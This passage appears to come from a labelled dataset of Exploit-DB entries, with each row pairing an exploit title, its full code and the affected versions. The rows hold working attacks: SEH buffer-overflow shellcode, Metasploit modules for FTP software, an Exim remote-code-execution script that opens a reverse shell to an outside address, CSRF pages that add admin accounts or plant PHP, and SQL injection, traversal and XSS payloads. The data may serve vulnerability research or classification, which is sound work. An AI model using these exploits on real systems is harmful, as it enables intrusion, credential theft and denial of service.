""\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x45"" ""\x51\x4a\x4b\x4b\x39\x51\x4c\x47\x54\x45\x54\x49\x53\x51\x4f"" ""\x50\x31\x4a\x56\x43\x50\x50\x56\x45\x34\x4c\x4b\x50\x46\x50"" ""\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d"" ""\x4c\x4b\x43\x58\x45\x58\x4d\x59\x4a\x58\x4c\x43\x49\x50\x42"" ""\x4a\x50\x50\x45\x38\x4c\x30\x4c\x4a\x44\x44\x51\x4f\x43\x58"" ""\x4a\x38\x4b\x4e\x4c\x4a\x44\x4e\x46\x37\x4b\x4f\x4a\x47\x42"" ""\x43\x42\x4d\x43\x54\x46\x4e\x43\x55\x43\x48\x43\x55\x51\x30"" ""\x46\x4f\x42\x43\x51\x30\x42\x4e\x42\x45\x44\x34\x47\x50\x44"" ""\x35\x42\x53\x45\x35\x43\x42\x51\x30\x43\x5a\x43\x55\x42\x4e"" ""\x42\x4e\x43\x49\x47\x50\x42\x50\x43\x51\x43\x43\x43\x43\x51"" ""\x30\x46\x4f\x51\x51\x51\x54\x51\x54\x51\x30\x51\x36\x47\x56"" ""\x47\x50\x42\x4e\x45\x35\x44\x34\x47\x50\x42\x4c\x42\x4f\x43"" ""\x53\x43\x51\x42\x4c\x43\x57\x42\x52\x42\x4f\x42\x55\x44\x30"" ""\x51\x30\x51\x51\x45\x34\x42\x4d\x42\x49\x42\x4e\x45\x39\x44"" ""\x33\x44\x34\x43\x42\x43\x51\x44\x34\x42\x4f\x42\x52\x43\x43"" ""\x47\x50\x43\x5a\x45\x35\x42\x4e\x42\x4e\x43\x49\x51\x30\x46"" ""\x4f\x47\x31\x51\x54\x47\x34\x43\x30\x41\x41"")  payload = ""\x41"" * 8			# junk buffer payload += ""\x90"" * 10			# nop sled sc = shellcode				# 446 bytes of shellcode jump_near = ""\xe9\x34\xfe\xff\xff""	# jump near -460 bytes next_seh = ""\xeb\xf9\xff\xff""		# short jump back -7 bytes seh = ""\x6f\x2a\xe6\x77""		# p/p/r from kernel32.dll junk = ""\x41"" * 424			# junk buffer  print ""[+] Connecting to %s on port %d"" % (host,port) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: 	s.connect((host,port)) 	print ""[+] Sending payload"" 	s.send(""GET /index.html"" + payload + sc + jump_near + next_seh + seh + junk + "" HTTP/1.0\r\n\r\n"") 	s.close() 	print ""[+] Done. User jenny created with the password of pass on %s\n"" % host except: 	print ""[x] Could not connect!""  # milw0rm.com [2009-09-11]","['2', 'SP3']",0
38153,cPanel WebHost Manager (WHM) - '/webmail/x3/mail/clientconf.html?acct' Cross-Site Scripting source: https://www.securityfocus.com/bid/57060/info  cPanel and WHM are prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  cPanel 11.34.0 and WHM 11.34.0 are vulnerable; other versions may also be affected.   http://www.example.com/webmail/x3/mail/clientconf.html?domain=&redirectdomain=&acct=%3Cscript%3Ealert%28%22XSS%20Vulnerability%22%29%3C/script%3E&archiving=0,['11.34.0'],1
16704,"LeapFTP 3.0.1 - Remote Stack Buffer Overflow (Metasploit) ## # $Id: leapftp_list_reply.rb 11039 2010-11-14 19:03:24Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::FtpServer 	include Msf::Exploit::Remote::Egghunter  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'LeapFTP 3.0.1 Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a buffer overflow in the LeapFTP 3.0.1 client. 				This issue is triggered when a file with a long name is downloaded/opened. 			}, 			'Author' 	 => 				[ 					'corelanc0d3r',  # Original bug, completed MSF module 					'nullthreat'     # Ported PoC to MSF 				], 			'License'        => MSF_LICENSE, 			'Version'        => ""$Revision: 11039 $"", 			'References'     => 				[ 					[ 'OSVDB', '68640'], 					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload'        => 				{ 					'Space'    => 1000, 					'BadChars' => ""\x00"", 					'StackAdjustment' => -3500, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows Universal', { 'Offset' => 528,'Ret' => 0x0042A8A8 } ], # ADD ESP,64, POP EBX, RET :) boy I love pvefindaddr 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Oct 12 2010', 			'DefaultTarget'  => 0)) 	end  	def setup 		super 	end  	def on_client_unknown_command(c,cmd,arg) 		c.put(""200 OK\r\n"") 	end  	def on_client_command_list(c,arg) 			conn = establish_data_connection(c) 			if(not conn) 				c.put(""425 Can't build data connection\r\n"") 				return 			end 			print_status("" - Data connection set up"") 			code = 150 			c.put(""#{code} Here comes the directory listing.\r\n"") 			code = 226 			c.put(""#{code} Directory send ok.\r\n"") 			# create the egg hunter 			badchars = """" 			eggoptions = 			{ 			:checksum => true, 			:eggtag => ""W00T"" 			} 			hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions) 			# Get the file ready 			junk = ""\x73\x65""  #73 65 = jump over filename = ""se"" 			junk << ""cret admin passwords.txt"" 			junk << ""_"" * ((target['Offset'])-junk.length-hunter.length) # _ = POP EDI 			junk << hunter 			seh = [target.ret].pack('V') 			shellcode = egg + egg + payload.encoded 			junk2 = rand_text_alpha((2000 - shellcode.length)) 			payload = junk + seh + shellcode + junk2 			strfile = payload 			print_status("" - Sending directory list via data connection"") 			dirlist = ""-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{strfile}.txt\r\n"" 			conn.put(""total 2\r\n""+dirlist) 			conn.close 			return 	end  end",['3.0.1'],1
31596,mcGallery 1.1 - 'admin.php?lang' Cross-Site Scripting source: https://www.securityfocus.com/bid/28587/info  mcGallery is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  mcGallery 1.1 is vulnerable; other versions may also be affected.   http://www.example.com/[path]/admin.php?lang=<script>alert(document.c-o-o-k-i-e)</script>,['1.1'],1
28947,Speedywiki 2.0/2.1 - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/20976/info  Speedywiki is prone to multiple input-validation vulnerabilities because the application fails to sufficiently sanitize user-supplied input. These issues include an arbitrary file-upload vulnerability and a cross-site scripting vulnerability.  An attacker may leverage these issues to upload and execute arbitrary code within the context of the affected webserver and to steal cookie-based authentication credentials. Other attacks are also possible.   Versions prior to 2.2 is vulnerable to this issue.  http://www.example.com/index.php?showRevisions=[xss],"['2.0/2.1', 'prior to 2.2']",1
44571,"Exim < 4.90.1 - 'base64d' Remote Code Execution #!/usr/bin/python import time import socket import struct s = None f = None def logo():    print    print ""        CVE-2018-6789 Poc Exploit""    print ""@straight_blast ; straightblast426@gmail.com""    print def connect(host, port):    global s    global f    s = socket.create_connection((host,port))    f = s.makefile('rw', bufsize=0) def p(v):    return struct.pack(""<Q"", v) def readuntil(delim='\n'):    data = ''    while not data.endswith(delim):       data += f.read(1)    return data def write(data):    f.write(data + ""\n"") def ehlo(v):    write(""EHLO "" + v)    readuntil('HELP') def unrec(v):    write(v)    readuntil('command') def auth_plain(v):    encode = v.encode('base64').replace('\n','').replace('=','')    write(""AUTH PLAIN "" + encode)    readuntil('data') def one_byte_overwrite():    v = ""C"" * 8200    encode = v.encode('base64').replace('\n','').replace('=','')    encode = encode[:-1] + ""PE""    write(""AUTH PLAIN "" + encode)    readuntil('data') def exploit():    logo()    connect('localhost', 25)    print ""[1] connected to target""    time.sleep(0.5)           ehlo(""A"" * 8000)         ehlo(""B"" * 16)    print ""[2] created free chunk size 0x6060 in unsorted bin""        unrec(""\xff"" * 2000)    ehlo(""D"" * 8200)    one_byte_overwrite()    print ""[3] triggered 1 byte overwrite to extend target chunk size from 0x2020 to 0x20f0""        fake_header  = p(0)     fake_header += p(0x1f51)    auth_plain(""E"" * 176 + fake_header + ""E"" * (8200-176-len(fake_header)))    print ""[4] patched chunk with fake header so extended chunk can be freed""        ehlo(""F"" * 16)    print ""[5] freed extended chunk""        unrec(""\xff"" * 2000)    unrec(""\xff"" * 2000)    print ""[6] occupied 1st and 3rd item in unsorted bin with fillers""        fake_header  = p(0x4110)    fake_header += p(0x1f50)       auth_plain(""G"" * 176 + fake_header + ""G"" * (8200-176-len(fake_header)))    print ""[7] patched chunk with fake header so extended chunk can be allocated""        address = 0x55d7e5864480    auth_plain(""H"" * 8200 + p(0x2021) + p(address)  + p(0x2008) + ""H"" * 184)    print ""[8] overwrite 'next' pointer with ACL store block address""        ehlo(""I"" * 16)    print ""[9] freed the ACL store block""        acl_smtp_rcpt_offset = 288    local_host = '192.168.0.159'    local_port = 1337    cmd = ""/bin/bash -c \""/bin/bash -i >& /dev/tcp/"" + local_host + ""/"" + str(local_port) + "" 0>&1\""""    cmd_expansion_string = ""${run{"" + cmd + ""}}\0""    auth_plain(""J"" * acl_smtp_rcpt_offset + cmd_expansion_string + ""J"" * (8200 - acl_smtp_rcpt_offset - len(cmd_expansion_string)))     print ""[10] malloced ACL store block and overwrite the content of 'acl_smtp_rcpt' with shell expression""     write(""MAIL FROM:<test@pwned.com>"")    readuntil(""OK"")    write(""RCPT TO:<shell@pwned.com>"")       print ""[11] triggered RCPT TO and executing shell expression ... enjoy your shell!""    print if __name__ == '__main__':    exploit()",['< 4.90.1'],1
39406,"yTree 1.94-1.1 - Local Buffer Overflow (PoC) # Exploit Author: Juan Sacco - http://www.exploitpack.com -jsacco@exploitpack.com # Program affected: yTree - File manager for terminals v1.94-1.1 # Description: yTree is prone to a stack-based overflow, an attacker could exploit  # this issue to execute arbitrary code in the context of the application.  # Failed exploit attempts will result in a denial-of-service condition. # # Tested and developed on:  Kali Linux 2.0 x86 - https://www.kali.org # # Program Description: This is a file manager that separates files from directories # and allows you to select and manage files from different directories.   # It works on black and white or color terminals and is UTF-8 locales aware. # Vendor homepage: http://www.han.de/~werner/ytree.html # Kali Linux 2.0 package: pool/main/y/ytree/ytree_1.94-1.1_i386.deb # MD5sum: 7d55d9c7e8afb4405c149463613f596b # # Program received signal SIGSEGV, Segmentation fault. # --------------------------------------------------------------------------[regs] #   EAX: 0x41414141  EBX: 0xB7FB8000  ECX: 0x00000000  EDX: 0x08071342  o d I t s z a P c  #   ESI: 0xBFFFF134  EDI: 0x41414141  EBP: 0x0806FC60  ESP: 0xBFFFDC50  EIP: 0xB7F888C1 #   CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B # --------------------------------------------------------------------------[code] # => 0xb7f888c1 <werase+49>: mov    eax,DWORD PTR [eax+0x4c] #    0xb7f888c4 <werase+52>: mov    DWORD PTR [esp+0x24],eax #    0xb7f888c8 <werase+56>: mov    eax,DWORD PTR [edi+0x50] #    0xb7f888cb <werase+59>: mov    DWORD PTR [esp+0x28],eax #    0xb7f888cf <werase+63>: mov    eax,DWORD PTR [edi+0x54] #    0xb7f888d2 <werase+66>: mov    DWORD PTR [esp+0x2c],eax #    0xb7f888d6 <werase+70>: mov    eax,DWORD PTR [edi+0x58] #    0xb7f888d9 <werase+73>: mov    DWORD PTR [esp+0x30],eax # -------------------------------------------------------------------------------- # 0xb7f888c1 in werase () from /lib/i386-linux-gnu/libncursesw.so.5 # gdb$ backtrace  # 0  0xb7f888c1 in werase () from /lib/i386-linux-gnu/libncursesw.so.5 # 1  0x08050f43 in ?? () # 2  0x08051182 in ?? () # 3  0x0805972f in ?? () # 4  0x0804a68a in ?? () # 5  0xb7d82a63 in __libc_start_main (main=0x804a560, argc=0x2, argv=0xbffff294, init=0x8064df0, fini=0x8064de0, rtld_fini=0xb7fedc90 <_dl_fini>, stack_end=0xbffff28c) at libc-start.c:287 # 6  0x0804a701 in ?? ()   import os,subprocess def run():   try:     print ""# yTree Buffer Overflow by Juan Sacco""     print ""# It's fuzzing time on unusable exploits""     print ""# This exploit is for educational purposes only""     # JUNK + SHELLCODE + NOPS + EIP       junk = ""\x41""*65     shellcode = ""\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80""     nops = ""\x90""*1200     eip = ""\xd0\xf6\xff\xbf""     subprocess.call([""ytree"",' ', junk + shellcode + nops + eip])     except OSError as e:     if e.errno == os.errno.ENOENT:         print ""Sorry, yTree not found!""     else:         print ""Error executing exploit""     raise   def howtousage():   print ""Snap! Something went wrong""   sys.exit(-1)   if __name__ == '__main__':   try:     print ""Exploit yTree v1.94-1.1 Local Overflow Exploit""     print ""Author: Juan Sacco""   except IndexError:     howtousage() run()",['1.94-1.1'],1
46411,"Oracle Java Runtime Environment - Heap Out-of-Bounds Read During TTF Font Rendering in ExtractBitMap_blocClass A heap-based out-of-bounds read was observed in Oracle Java Runtime Environment version 8u202 (latest at the time of this writing) while fuzz-testing the processing of TrueType fonts. It manifests itself in the form of the following (or similar) crash:  --- cut ---   Iteration (0,0)   Iteration (0,1)   #   # A fatal error has been detected by the Java Runtime Environment:   #   #  SIGSEGV (0xb) at pc=0x00007f857116fde3, pid=31542, tid=0x00007f85a5a70700   #   # JRE version: Java(TM) SE Runtime Environment (8.0_202-b08) (build 1.8.0_202-b08)   # Java VM: Java HotSpot(TM) 64-Bit Server VM (25.202-b08 mixed mode linux-amd64 compressed oops)   # Problematic frame:   # C  [libt2k.so+0x4cde3]  ExtractBitMap_blocClass+0xcc3   #   # Failed to write core dump. Core dumps have been disabled. To enable core dumping, try ""ulimit -c unlimited"" before starting Java again   #   # An error report file with more information is saved as:   # jre/8u202/hs_err_pid31542.log   #   # If you would like to submit a bug report, please visit:   #   http://bugreport.java.com/bugreport/crash.jsp   # The crash happened outside the Java Virtual Machine in native code.   # See problematic frame for where to report the bug.   #   Aborted --- cut ---  Under gdb, we can find out that the ExtractBitMap_blocClass function attempts to access an invalid memory region:  --- cut ---   gdb$ c   Continuing.   Iteration (0,0)   Iteration (0,1)    Thread 2 ""java"" received signal SIGSEGV, Segmentation fault.   [----------------------------------registers-----------------------------------]   RAX: 0x96e40 ('@n\t')   RBX: 0x100c4   RCX: 0x12dc8   RDX: 0x757969c4   RSI: 0x7ffff02f7238 --> 0x7840201008   [...]   [-------------------------------------code-------------------------------------]      0x7fffbf616ddb <ExtractBitMap_blocClass+3259>:       mov    ecx,eax      0x7fffbf616ddd <ExtractBitMap_blocClass+3261>:       sar    ecx,0x3      0x7fffbf616de0 <ExtractBitMap_blocClass+3264>:       movsxd rcx,ecx   => 0x7fffbf616de3 <ExtractBitMap_blocClass+3267>:       movzx  edi,BYTE PTR [rsi+rcx*1]      0x7fffbf616de7 <ExtractBitMap_blocClass+3271>:       cmp    edx,r8d      0x7fffbf616dea <ExtractBitMap_blocClass+3274>:       jl     0x7fffbf616dd0 <ExtractBitMap_blocClass+3248>      0x7fffbf616dec <ExtractBitMap_blocClass+3276>:       mov    ecx,r11d      0x7fffbf616def <ExtractBitMap_blocClass+3279>:       mov    r13d,0x80   [------------------------------------stack-------------------------------------]   [...]   [------------------------------------------------------------------------------]   Legend: code, data, rodata, value   Stopped reason: SIGSEGV   0x00007fffbf616de3 in ExtractBitMap_blocClass () from jre/8u202/lib/amd64/libt2k.so --- cut ---  The crash reproduces on both Windows and Linux platforms. On Windows, the crash manifests in the following way:  --- cut ---   (5218.154c): Access violation - code c0000005 (first chance)   First chance exceptions are reported before any exception handling.   This exception may be expected and handled.   t2k!Java_sun_font_T2KFontScaler_getGlyphVectorOutlineNative+0x2155:   00007ffa`0b8eb651 468a1c20        mov     r11b,byte ptr [rax+r12] ds:00000000`64c09000=??   0:004> ? rax   Evaluate expression: 84720 = 00000000`00014af0   0:004> ? r12   Evaluate expression: 1690256656 = 00000000`64bf4510   0:004> k    # Child-SP          RetAddr           Call Site   00 00000000`04a8e9d0 00007ffa`0b8ebf92 t2k!Java_sun_font_T2KFontScaler_getGlyphVectorOutlineNative+0x2155   01 00000000`04a8eaa0 00007ffa`0b8e8e05 t2k!Java_sun_font_T2KFontScaler_getGlyphVectorOutlineNative+0x2a96   02 00000000`04a8eb80 00007ffa`0b8e9011 t2k!Java_sun_font_T2KFontScaler_getGlyphCodeNative+0xd4fd   03 00000000`04a8ebf0 00007ffa`0b8daeab t2k!Java_sun_font_T2KFontScaler_getGlyphCodeNative+0xd709   04 00000000`04a8ec90 00000000`04f18d27 t2k!Java_sun_font_T2KFontScaler_getGlyphImageNative+0x163   05 00000000`04a8ed60 00000000`02a3e1f8 0x4f18d27   06 00000000`04a8ed68 00000000`04a8ee48 0x2a3e1f8   07 00000000`04a8ed70 00000000`5c36dff8 0x4a8ee48   08 00000000`04a8ed78 00000000`00000000 0x5c36dff8 --- cut ---  Attached with this report are three mutated testcases, and a simple Java program used to reproduce the vulnerability by loading TrueType fonts specified through a command-line parameter.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46411.zip",['8u202'],1
38032,"Viber 4.2.0 - Non-Printable Characters Handling Denial of Service #!/usr/bin/perl -w #-*- coding: utf-8 -* # #[+] Title:  Viber Non-Printable Characters Handling Denial of Service Vulnerability #[+] Product: Viber #[+] Vendor: http://www.viber.com/en/ #[+] SoftWare Link : https://itunes.apple.com/app/viber-free-phone-calls/id382617920?mt=8 #[+] Vulnerable Version(s): Viber 4.2.0 on IOS 7.1.2 # # # Author      :   Mohammad Reza Espargham # Linkedin    :   https://ir.linkedin.com/in/rezasp # E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com # Website     :   www.reza.es # Twitter     :   https://twitter.com/rezesp # FaceBook    :   https://www.facebook.com/mohammadreza.espargham   #Source :  https://www.securityfocus.com/bid/75217/info   # 1.run perl code # 2.Copy the perl output text # 3.Open Viber Desktop # 4.Select Your VICTIM # 5.Paste and Message # 6.Enjoy   use open ':std', ':encoding(UTF-8)'; system(($^O eq 'MSWin32') ? 'cls' : 'clear'); use MIME::Base64;  $ut=""M7tktuYbL14T""; $utd = decode_base64($ut);  $lt=""sNiw2KAg2KAg2Ao=""; $ltd = decode_base64($lt);  $bt=""M7tktuYbL14T""; $btd = decode_base64($bt);   $junk=""Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9"". ""Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9"". ""Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"". ""Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9"". ""Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"". ""Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9"". ""Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9"". ""Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9"". ""Aq0Aq1Aq2Aq3Aq4Aq5Aq""; $tt=""\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"" . ""\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"";  $buffer = ""A""x153; # 100xA $buffer1 = ""A""x63; #5xA print ""\n\n$utd$buffer$ltd$tt$buffer1$junk$btd\n\n""; #END <3",['4.2.0'],1
12081,"Jzip 1.3 - '.zip' Unicode Buffer Overflow (PoC) <?php /* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Jzip v1.3 (.zip) Unicode buffer overflow 0day PoC Date: 6/4/2010 Author: mr_me (http://net-ninja.net/) Software Link: http://www.jzip.com/ Version: 1.3 Tested on: Windows XP SP3 En Advisory: http://www.corelan.be:8800/advisories.php?id=10-021 Greetz to: Corelan Security Team http://www.corelan.be:8800/index.php/security/corelan-team-members/ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Note:  jzip.exe and all associated modules are compiled with safeseh and combine that with the unicode limitation proves very difficult for exploitation. We did not  find a working unicode address, otherwise this vulnerability would have been  alot more fun! The seven moons were not aligned as Ben puts it :) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Script provided 'as is', without any warranty. Use for educational purposes only. Do not use this code to do anything illegal !  Note : you are not allowed to edit/modify this code.   If you do, Corelan cannot be held responsible for any damages this may cause. */  $lf_header = ""\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00"";  $cdf_header = ""\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"". ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00"". ""\x24\x00\x00\x00\x00\x00\x00\x00"";  $efcdr_record = ""\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"". ""\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00"";  $___offset = 4064; $___nseh = str_repeat(""\x43"",2); $___seh = str_repeat(""\x44"",2);  $___exploit = str_repeat(""\x41"",810). $___nseh. $___seh; $___exploit .=  str_repeat(""\x41"",$___offset-strlen($___exploit)). ""\x2e\x74\x78\x74"";  $_____b00m = $lf_header.$___exploit.$cdf_header.$___exploit.$efcdr_record; file_put_contents(""cst-jzip.zip"",$_____b00m); ?>",['1.3'],1
11742,"(Gabriel's FTP Server) Open & Compact FTPd 1.2 - Buffer Overflow (Metasploit) # Exploit Title: Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow MSF # Date: March 14, 2010 # Author: Blake # Version: 1.2 # Tested on: XP SP3  Exploit causes the ftp server to crash so adduser, etc. payloads are most effective.    require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote     Rank = AverageRanking      include Msf::Exploit::Remote::Ftp      def initialize(info = {})         super(update_info(info,             'Name'           => 'Open & Compact FTPd 1.2 Pre-Authentication Buffer Overflow',             'Description'    => %q{                 This module exploits a stack overflow in the USER verb in Open & Compact FTPd version 1.2. The program will crash once the payload is sent, so bind shell payloads are not effective.              },             'Author'         => 'Blake',             'License'        => MSF_LICENSE,             'Version'        => 'Version 1',             'References'     =>                 [                     [ 'EDB-ID', '11420'],                     [ 'URL', 'http://www.exploit-db.com/exploits/11420' ],                 ],             'Privileged'     => true,             'DefaultOptions' =>                 {                     'EXITFUNC' => 'process',                 },             'Payload'        =>                 {                     'Space'    => 400,                     'BadChars' => ""\x00\x20\x0a\x0d"",                     'StackAdjustment' => -3500,                 },             'Platform'       => 'win',             'Targets'        =>                 [                     [ 'Windows XP SP2/SP3 English',       { 'Ret' => 0x00202c42 } ],                  ],             'DisclosureDate' => 'Feb 12, 2010',             'DefaultTarget'  => 0))     end       def exploit         connect          sploit =  ""\x42\x2c\x20"" * 199         sploit << make_nops(10)         sploit << payload.encoded          print_status(""Trying target {target.name<http://target.name>}..."")          login = ""USER + sploit + \r\n""         login << ""PASS "" + rand_text_alphanumeric(12)          sock.put(login + ""\r\n"")          handler         disconnect     end  end",['1.2'],1
29841,PHPFaber TopSites 3 - 'admin/index.php' Directory Traversal source: https://www.securityfocus.com/bid/23419/info  TopSites is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the webserver process. Information obtained may aid in further attacks.  This issue affects TopSites 3; other versions may also be vulnerable.   http://www.example.com/Path/admin/index.php?page=template&modify=../../../../../../etc/passwd http://www.example.com/Path/admin/index.php?page=template&modify=inc/config.ini.php,['3'],1
38744,"appRain CMF - Multiple Cross-Site Request Forgery Vulnerabilities source: https://www.securityfocus.com/bid/62061/info  appRain CMF is prone to multiple cross-site request-forgery vulnerabilities.  Exploiting these issues may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.  appRain CMF 3.0.2 is vulnerable; other versions may also be affected.   <img src=""http://www.example.com//appRain-v-3.0.2/common/delete_row/Admin/[ID]"" width=""1"" height=""1"">  <html> <body onload=""submitForm()""> <form name=""myForm"" id=""myForm""                 action=""http://www.example.com/appRain-v-3.0.2/admin/manage/add"" method=""post"">                 <input type=""hidden"" name=""data[Admin][f_name]"" value=""abc"">                 <input type=""hidden"" name=""data[Admin][l_name]"" value=""defghi"">                 <input type=""hidden"" name=""data[Admin][email]"" value=""y.xvz@gmail.com"">                 <input type=""hidden"" name=""data[Admin][username]"" value=""abc"">                 <input type=""hidden"" name=""data[Admin][password]"" value=""abc123"">                 <input type=""hidden"" name=""data[Admin][status]"" value=""Active"">                 <input type=""hidden"" name=""data[Admin][description]"" value=""""> </form> <script type='text/javascript'>document.myForm.submit();</script> </html>",['3.0.2'],1
15570,"Joomla! Component com_mtree 2.1.6 - Overwrite Cross-Site Request Forgery <?php /**   * Mosets Tree 2.1.6 (Joomla) Template Overwrite CSRF   * 3 October 2010   * jdc   *   * How it works - admin template form has no nonce   * How to exploit - get a logged in admin to click the wrong link ;)   * Patched in 2.1.7   */ // change these $target = 'http://localhost/joomla'; $exploit = '<?php echo phpinfo(); ?>'; /* page - any one of: page_addCategory page_addListing page_advSearchRedirect page_advSearchResults page_advSearch page_claim page_confirmDelete page_contactOwner page_errorListing page_error page_gallery page_image page_index page_listAlpha page_listing page_listListings page_ownerListing page_print page_recommend page_replyReview page_reportReview page_report page_searchByResults page_searchResults page_subCatIndex page_usersFavourites page_usersReview page_writeReview sub_alphaIndex sub_images sub_listingDetails sub_listings sub_listingSummary sub_map sub_reviews sub_subCats */ $page = 'page_print'; // don't change these $path = '/administrator/index.php'; $data = array(      'pagecontent' => $exploit,      'template' => 'm2',      'option' => 'com_mtree',      'task' => 'save_templatepage',      'page' => $page ); ?> <html> <body> <?php if (@$_GET['iframe']) : ?> <form id=""csrf"" action=""<?php echo $target.$path; ?>"" method=""post""> <?php foreach ($data as $k => $v) : ?> <input type=""text"" value=""<?php echo htmlspecialchars($v); ?>""  name=""<?php echo $k; ?>"" /> <?php endforeach; ?> <script type=""text/javascript""> document.forms[0].submit(); </script> </form> <?php else : ?> <h1>Mosets Tree 2.1.6 Template Overwrite CSRF Exploit</h1> <p>If you were logged in as admin, you just got owned!</p> <div style=""display:none""> <iframe width=""1"" height=""1"" src=""<?php __FILE__; ?>?iframe=1""></iframe> </div> <?php endif; ?> </body> </html>","['2.1.6', '2.1.7']",1
5488,"Joomla! Component Filiale 1.0.4 - 'idFiliale' SQL Injection              ########################################################################              #                                                                      #              #       [ Joomla Component Filiale SQL Injection ]                     #              #                                                                      #              ########################################################################        [  M a f i a  C R E W  ] ########################################## [~] Vulnerability found by: Str0xo [ Mafia Crew ] [~] Contact: x02[at]hotmail.de [~] Website: http://www.dz-h4ck3rz.com  [~] special tnx to: co2  [~] Greetings: [ lina-no promises ] & [ HIs0k4 ]  ########################################## [~] ScriptName : 'Joomla' [~] ModuleName : 'Filiale' [~]  Version() :  1.0.4 ########################################### [~]  [~] DORK 1 :  inurl:com_filiale [~] ###########################################  [~]  [~] [+]Demo : http://www.xxx.be/index.php?option=com_filiale  [~] [~] [+]Exploit : /index.php?option=com_filiale&idFiliale=-5+union+select+1,password,3,4,username,6,7,8,9,10,11+from+jos_users  [~]  ###########################################  # milw0rm.com [2008-04-23]",['1.0.4'],1
